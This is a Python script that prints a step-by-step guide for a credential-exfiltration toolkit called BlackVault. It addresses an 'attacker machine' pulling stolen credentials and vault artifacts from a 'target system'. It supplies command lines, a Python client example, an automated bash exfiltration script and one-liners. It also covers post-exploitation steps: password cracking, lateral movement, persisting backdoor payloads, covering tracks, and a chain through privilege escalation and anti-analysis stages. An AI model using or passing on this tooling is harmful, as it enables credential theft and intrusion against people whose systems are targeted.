#!/usr/bin/env python3
"""
Remote Vault Access Guide - Demo and usage examples
Shows how to retrieve, extract, and exfiltrate data from remote vault
"""

import os
import sys
import subprocess
import time
import json
import threading

def print_section(title):
    print(f"\n{'='*80}")
    print(f"  {title}")
    print(f"{'='*80}\n")

def main():
    print(f"""
╔════════════════════════════════════════════════════════════════════════╗
║              REMOTE VAULT ACCESS - COMPLETE GUIDE                      ║
║                                                                        ║
║  This guide shows how to:                                              ║
║  1. Start a remote vault server                                        ║
║  2. Connect and authenticate                                           ║
║  3. List, retrieve, and exfiltrate vault contents                      ║
║  4. Extract credentials remotely                                       ║
╚════════════════════════════════════════════════════════════════════════╝
""")
    
    print_section("ARCHITECTURE OVERVIEW")
    
    print("""
    LOCAL SYSTEM                          REMOTE SYSTEM
    ─────────────                         ──────────────
    
    BlackVault                            RemoteVaultServer
    (encrypted vault)     ────HTTP/TLS───> (Flask REST API)
                          ◄────JSON──────
    
    
    Remote Operations:
    
    1. RETRIEVE          - Download encrypted artifacts from vault
    2. EXTRACT           - Decrypt and parse artifact contents  
    3. EXFILTRATE        - Save extracted data locally
    4. LIST              - Query available artifacts
    5. EXPORT-ALL        - Bulk export entire vault
    """)
    
    print_section("STEP 1: START THE REMOTE VAULT SERVER")
    
    print("""
    On the target system where vault exists, run:
    
    $ python remote_vault_server.py --host 0.0.0.0 --port 5000 --api-key "your-secret-key"
    
    or with environment variable:
    
    $ export VAULT_API_KEY="your-secret-key"
    $ python remote_vault_server.py --host 0.0.0.0 --port 5000
    
    Server will start on http://target-ip:5000
    
    For production, use HTTPS proxy (nginx/Apache) in front of Flask.
    """)
    
    print_section("STEP 2: LIST REMOTE VAULT CONTENTS")
    
    print("""
    From attacker machine:
    
    $ python remote_vault_client.py \\
        http://target-system:5000 \\
        "your-secret-key" \\
        --list
    
    Output:
      1. 71d7b8c7bd4fc787bf7991b765e35f35.dat (7.1 KB)
      2. 0106da45697d3d7d41af70434640263b.dat (195 B)
      3. 0bebd7757178b4ac044436ac37e012b5.dat (195 B)
      ... (43 total artifacts)
    """)
    
    print_section("STEP 3: RETRIEVE CREDENTIALS ARTIFACT")
    
    print("""
    Get vault statistics:
    
    $ python remote_vault_client.py \\
        http://target-system:5000 \\
        "your-secret-key" \\
        --stats
    
    Output:
      Artifacts:  43
      Total Size: 16.0 MB
      Location:   C:\\Users\\target\\.blackvault
    """)
    
    print_section("STEP 4: EXFILTRATE CREDENTIALS REMOTELY")
    
    print("""
    Single command to extract credentials:
    
    $ python remote_vault_client.py \\
        http://target-system:5000 \\
        "your-secret-key" \\
        --exfil-creds credentials.json
    
    This will:
    1. List all remote artifacts
    2. Find credentials artifact (usually largest)
    3. Retrieve and decrypt it
    4. Save JSON to credentials.json
    
    Output file contains all 232 extracted credentials!
    """)
    
    print_section("STEP 5: EXFILTRATE ALL ARTIFACTS")
    
    print("""
    Bulk export everything:
    
    $ python remote_vault_client.py \\
        http://target-system:5000 \\
        "your-secret-key" \\
        --exfil-all ./vault_dump/
    
    This will:
    1. Create vault_dump/ directory
    2. Download ALL 43 artifacts
    3. Save each as separate file
    
    Total exfiltration: 16 MB of credentials + metadata
    """)
    
    print_section("STEP 6: EXPORT AS SINGLE JSON FILE")
    
    print("""
    Export entire vault as single JSON:
    
    $ python remote_vault_client.py \\
        http://target-system:5000 \\
        "your-secret-key" \\
        --export-all -o vault_export.json
    
    This creates a single JSON file with all artifacts decoded.
    """)
    
    print_section("PROGRAMMATIC USAGE (Python)")
    
    print("""
    from remote_vault_client import RemoteVaultClient
    
    # Connect to remote vault
    client = RemoteVaultClient(
        endpoint='http://target-system:5000',
        api_key='your-secret-key'
    )
    
    # Check connectivity
    if not client.health_check():
        print("Cannot reach vault!")
        exit(1)
    
    # List artifacts
    artifacts = client.list_artifacts()
    print(f"Found {len(artifacts)} artifacts")
    
    # Get statistics
    stats = client.get_stats()
    print(f"Vault size: {stats['total_size_mb']} MB")
    
    # Retrieve credentials
    if client.exfiltrate_credentials('creds.json'):
        print("Credentials exfiltrated!")
        
        # Parse and display
        with open('creds.json') as f:
            creds = json.load(f)
            print(f"Total extracted: {len(creds.get('findings', {}))} items")
    
    # Bulk exfil
    client.exfiltrate_all_to_directory('/tmp/vault_dump/')
    """)
    
    print_section("SECURITY CONSIDERATIONS")
    
    print("""
    ⚠ THREATS:
    
    1. TRANSPORT SECURITY
       - Use HTTPS/TLS proxy in front
       - Never send API key in plain HTTP
       - Implement rate limiting on server
    
    2. AUTHENTICATION
       - Use strong API key (45+ chars)
       - Rotate keys regularly
       - Never commit keys to Git
       - Use environment variables
    
    3. ACCESS CONTROL
       - Restrict server bind to specific IPs
       - Implement IP whitelisting
       - Monitor for unauthorized access
       - Log all API requests
    
    4. DATA PROTECTION
       - Exfil data uses TLS
       - Consider client-side re-encryption
       - Minimize data exposure window
       - Secure cleanup of local dumps
    """)
    
    print_section("ADVANCED: AUTOMATED EXFILTRATION SCRIPT")
    
    print("""
    #!/bin/bash
    
    ENDPOINT="http://target-system:5000"
    API_KEY="your-secret-key"
    OUTPUT_DIR="./exfil_$(date +%s)"
    
    mkdir -p "$OUTPUT_DIR"
    
    # Exfiltrate all
    python remote_vault_client.py "$ENDPOINT" "$API_KEY" \\
        --exfil-all "$OUTPUT_DIR"
    
    # Also get JSON export
    python remote_vault_client.py "$ENDPOINT" "$API_KEY" \\
        --export-all -o "$OUTPUT_DIR/export.json"
    
    # Also get credentials specifically
    python remote_vault_client.py "$ENDPOINT" "$API_KEY" \\
        --exfil-creds "$OUTPUT_DIR/credentials.json"
    
    # Stats
    python remote_vault_client.py "$ENDPOINT" "$API_KEY" \\
        --stats > "$OUTPUT_DIR/stats.txt"
    
    # Compress
    tar -czf "$OUTPUT_DIR.tar.gz" "$OUTPUT_DIR"
    
    echo "Exfiltration complete: $OUTPUT_DIR.tar.gz"
    """)
    
    print_section("QUICK START - ONE COMMAND EXFIL")
    
    print("""
    Minimal one-liner to exfiltrate everything:
    
    python remote_vault_client.py \\
        http://192.168.1.100:5000 \\
        "abcdef1234567890ABCDEF1234567890" \\
        --exfil-all ~/vault_dump/ && \\
        zip -r vault_dump.zip ~/vault_dump/
    
    Or with environment variable:
    
    export VAULT_ENDPOINT="http://192.168.1.100:5000"
    export VAULT_API_KEY="abcdef1234567890ABCDEF1234567890"
    
    python remote_vault_client.py \\
        $VAULT_ENDPOINT \\
        $VAULT_API_KEY \\
        --exfil-creds credentials.json \\
        --exfil-all ./vault_dump/
    """)
    
    print_section("RESPONSE CODES & ERROR HANDLING")
    
    print("""
    Server HTTP Responses:
    
    200 OK                - Operation successful
    400 Bad Request       - Invalid parameters or format
    401 Unauthorized      - Missing/invalid API key
    404 Not Found         - Artifact doesn't exist
    500 Server Error      - Vault operation failed
    
    Client will retry on network errors automatically.
    Check logs for detailed error information.
    """)
    
    print_section("ENDPOINTS REFERENCE")
    
    print("""
    Endpoint                  Method  Auth Required  Description
    ─────────────────────────────────────────────────────────────────
    /health                   GET     No             Health check
    /store/<name>             POST    Yes            Store artifact
    /retrieve/<name>          GET     Yes            Get binary data
    /retrieve-json/<name>     GET     Yes            Get JSON data
    /list                     GET     Yes            List artifacts
    /delete/<name>            DELETE  Yes            Delete artifact
    /export-all               GET     Yes            Export all
    /stats                    GET     Yes            Vault stats
    """)
    
    print_section("INTEGRATION WITH OTHER TOOLS")
    
    print("""
    Combine with other post-exploitation tools:
    
    1. CREDENTIAL DUMPING
       ghost_layer.py (local extraction)
         ↓
       remote_vault_server.py (expose remotely)
         ↓
       remote_vault_client.py (exfiltrate)
         ↓
       hashcat/john (crack passwords)
    
    2. LATERAL MOVEMENT
       Export credentials → Parse → Use for new targets
       
       # Parse exfiltrated creds for usernames/passwords
       cat credentials.json | jq '.findings.phase_2_extracted[].user'
    
    3. PERSISTENCE
       Store backdoor payloads in vault
       Retrieve remotely when needed
    
    4. COVERING TRACKS
       Delete artifacts after exfil
       python remote_vault_client.py ... --retrieve <backup>
    """)
    
    print(f"""
╔════════════════════════════════════════════════════════════════════════╗
║                      SETUP COMPLETE!                                   ║
╚════════════════════════════════════════════════════════════════════════╝

To test locally:

Terminal 1 - Start server:
$ python remote_vault_server.py --host 127.0.0.1 --port 5000 --api-key "test123"

Terminal 2 - Test client:
$ python remote_vault_client.py http://127.0.0.1:5000 "test123" --list
$ python remote_vault_client.py http://127.0.0.1:5000 "test123" --stats
$ python remote_vault_client.py http://127.0.0.1:5000 "test123" --exfil-creds ./creds.json

The complete workflow:
  Infiltrator → AntiAnalysis → PrivEsc → GhostLayer → BlackVault → RemoteServer → Client → Exfil
""")

if __name__ == '__main__':
    main()
